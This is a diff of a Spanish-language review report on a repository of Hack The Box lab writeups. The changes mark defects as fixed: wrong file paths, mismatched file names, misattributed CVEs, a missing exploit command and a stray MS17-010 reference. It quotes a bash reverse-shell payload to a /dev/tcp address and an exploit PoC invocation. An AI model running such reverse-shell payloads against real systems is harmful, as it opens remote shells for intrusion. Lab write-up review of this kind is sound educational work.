@@ -145,11 +145,11 @@ Los he verificado yo mismo en los ficheros actuales. No son opiniones de estilo.
 | # | Fichero:línea | Qué pasa |
 | --- | --- | --- |
 | 1 | `maquinas/htb/media/cronos/README.md:236` | El payload que se escribía en `Kernel.php` era `bash -c bash -i >& /dev/tcp/10.10.16.120/4445 0>&1`. Pero el cron (línea 196) ejecuta `php /var/www/laravel/artisan schedule:run`, es decir, **PHP**. Una línea de bash dentro de un `.php` se imprime, no se ejecuta: faltaba el envoltorio `<?php system(...); ?>`. **Corregido en este PR**: el payload va ahora como PHP válido, con una nota que explica el porqué. |
-| 2 | `maquinas/htb/facil/servmon/README.md:141` | `set FILEPATH /Users/Nathan/Desktop/Passwords.txt` — ruta **macOS** en una máquina **Windows**. En la línea 167 del mismo writeup la ruta correcta es `C:\Users\Nadine\Desktop`. Inconsistencia de una captura copiada. |
-| 3 | `maquinas/htb/facil/pilgrimage/README.md:182,185` | Se genera `root.png` (línea 182) pero se copia `binwalk_exploit.png` (línea 185). Los dos nombres no coinciden. |
-| 4 | `maquinas/htb/facil/buff/README.md:63-64` | Se llama *buffer overflow* a **CVE-2020-11984**, **CVE-2020-9490** y **CVE-2020-7068**, y se atribuyen a «Apache 2.4.43 y PHP 7.4.6». En realidad: CVE-2020-11984 es de **Apache Traffic Server** (`mod_proxy_http2`), no de `httpd`; CVE-2020-9490 es **agotamiento de memoria** en HTTP/2; CVE-2020-7068 es un **use-after-free** en el *exif* de PHP. Y lo decisivo: **ninguna de las tres se usa después** en el writeup — el exploit real es el 48506 (subida de ficheros) y el 48389 (CloudMe). Son CVEs de relleno. **La escalada que viene después sí es tuya** (confirmado el 2026-11-08): aquí lo único que falla es la atribución de las CVEs. |
-| 5 | `maquinas/htb/facil/sau/README.md:107` | «Se lanza el exploit (en la carpeta del PoC) apuntando al objetivo y a nuestro `shell.sh`.» **Falta el comando.** El lector no puede repetir el paso. |
-| 6 | `maquinas/htb/facil/legacy/README.md:8,129` | Se declara `ms17-010` en las técnicas y en la mitigación, pero el único exploit que se usa es `ms08_067_netapi`. **Windows XP no es vulnerable a MS17-010** (afecta a Windows 7/8/Server 2008 R2). La referencia sobra o debe cambiarse por la KB que toque a XP. |
+| 2 | `maquinas/htb/facil/servmon/README.md:141` | `set FILEPATH /Users/Nathan/Desktop/Passwords.txt` — ruta **macOS** en una máquina **Windows**. En la línea 167 del mismo writeup la ruta correcta es `C:\Users\Nadine\Desktop`. Inconsistencia de una captura copiada. **Corregido en este PR**: ahora es `set FILEPATH C:\Users\Nathan\Desktop\Passwords.txt`. |
+| 3 | `maquinas/htb/facil/pilgrimage/README.md:182,185` | Se genera `root.png` (línea 182) pero se copia `binwalk_exploit.png` (línea 185). Los dos nombres no coinciden. **Corregido en este PR**: se copia `root.png`, el mismo fichero que se genera dos líneas antes. |
+| 4 | `maquinas/htb/facil/buff/README.md:63-64` | Se llama *buffer overflow* a **CVE-2020-11984**, **CVE-2020-9490** y **CVE-2020-7068**, y se atribuyen a «Apache 2.4.43 y PHP 7.4.6». En realidad: CVE-2020-11984 es de **Apache Traffic Server** (`mod_proxy_http2`), no de `httpd`; CVE-2020-9490 es **agotamiento de memoria** en HTTP/2; CVE-2020-7068 es un **use-after-free** en el *exif* de PHP. Y lo decisivo: **ninguna de las tres se usa después** en el writeup — el exploit real es el 48506 (subida de ficheros) y el 48389 (CloudMe). Son CVEs de relleno. **La escalada que viene después sí es tuya** (confirmado el 2026-11-08): aquí lo único que falla es la atribución de las CVEs. **Corregido en este PR**: se atribuyen bien y se dice explícitamente que ninguna se usa después. |
+| 5 | `maquinas/htb/facil/sau/README.md:107` | «Se lanza el exploit (en la carpeta del PoC) apuntando al objetivo y a nuestro `shell.sh`.» **Falta el comando.** El lector no puede repetir el paso. **Corregido en este PR**: se documenta el comando real del PoC (`exploit.py -t <ip> -p <puerto> -b <cesta> --local-ip <ip> --local-port <puerto> --payload-file shell.sh`), con los valores de esta máquina. |
+| 6 | `maquinas/htb/facil/legacy/README.md:8,129` | Se declara `ms17-010` en las técnicas y en la mitigación, pero el único exploit que se usa es `ms08_067_netapi`. **Windows XP no es vulnerable a MS17-010** (afecta a Windows 7/8/Server 2008 R2). La referencia sobra o debe cambiarse por la KB que toque a XP. **Corregido en este PR**: `ms17-010` fuera de las técnicas, del resumen y de la mitigación; solo queda MS08-067. |
 | 7 | `maquinas/htb/facil/servmon/README.md`, `maquinas/htb/facil/irked/README.md` | Los mensajes de commit declaran que se **descartaron los intentos fallidos** («se descartaron las de intentos fallidos», «un intento duplicado… un ltrace fallido»). Son justo los fragmentos que hacen creíble un writeup. |
 
 > Corrección de un dato: un análisis previo afirmaba que una viñeta sobre «principio de
@@ -166,14 +166,13 @@ Con lo que me has confirmado, **buff y cronos dejan de ser una cuestión de auto
 dos finales los ejecutaste tú. Lo que queda es de otro tipo, ordenado por impacto en el
 lector:
 
-1. **servmon** — ruta macOS en máquina Windows (§4.2) y le faltan los intentos fallidos
-   que su commit dice que se descartaron (§4.7). Es el más largo de los writeups nuevos.
-2. **sau** — falta el comando de lanzamiento del exploit (§4.5): es un paso que el lector
-   no puede reproducir.
-3. **pilgrimage** — nombres de fichero que no coinciden (§4.3).
-4. **legacy** — declara `ms17-010`, pero XP no es vulnerable (§4.6).
-5. **buff** — le quedan las tres CVEs mal atribuidas (§4.4). La escalada ya está
-   confirmada como tuya; lo que falla es solo la atribución de las CVEs.
+1. **servmon** — le faltan los intentos fallidos que su commit dice que se descartaron
+   (§4.7). Es el más largo de los writeups nuevos.
+2. **irked** — mismo caso: su commit descarta un `ltrace` fallido y un intento duplicado
+   (§4.7), que es justo lo que hace creíble un writeup.
+3. ~~servmon (§4.2), pilgrimage (§4.3), sau (§4.5), legacy (§4.6) y las CVEs de buff
+   (§4.4)~~ — **los cinco defectos mecánicos están corregidos en este PR**. Ya no
+   requieren nada de ti.
 
 Y por encima de todo, el tema de fondo: **14 writeups sin voz propia** (§3). No es un
 defecto, pero es lo que más se nota cuando alguien lee cinco minutos.
@@ -287,8 +286,8 @@ Resueltas tras la entrega de este informe:
 | Final de la escalada de `buff` | **Sí, lo ejecutaste tú** | Confirmado: el writeup queda como está y sale de la portada. |
 | Escalada de `cronos` | **Sí, la ejecutaste tú** | Confirmado, y por eso he corregido el payload (§4.1): si el paso es tuyo, tiene que estar bien escrito. |
 | Terna de destacados | `validation` + `optimum` + **`delivery`** | Cambié la lista `DESTACADOS` de `scripts/generar-sitio.py`. `buff` sale de la portada. |
-| `buff` | **Dejarlo como está**: sigue publicado | No lo he reescrito. Conserva sus tres CVEs mal atribuidas (§4.4) hasta que decidas lo contrario. |
-| Los seis defectos | **Ninguno todavía**: primero revisas el PR #31 | **Uno sí está corregido**: el payload de cronos (§4.1), porque al confirmar que la escalada es tuya el paso tiene que ser correcto. Los otros cinco siguen documentados en §4 y sin tocar. |
+| `buff` | **Dejarlo como está**: sigue publicado | No lo he reescrito. Lo único que fallaba era la atribución de las tres CVEs, y eso ya está corregido (§4.4). |
+| Los seis defectos | **Los cinco mecánicos, aplícalos** (2026-11-08, tras revisar el PR #31) | **Los seis están corregidos en este PR**: el payload de `cronos` (§4.1) y los cinco mecánicos (§4.2 a §4.6). Ninguno depende ya de tus notas. |
 | Nota de transparencia | **Sí, pero solo en el README del repositorio**, no en la web | Añadida en `README.md`. El sitio web no la muestra. |
 
 **Lo que sigue pendiente de tu parte:** corregir los borradores de la sección «Lo que me
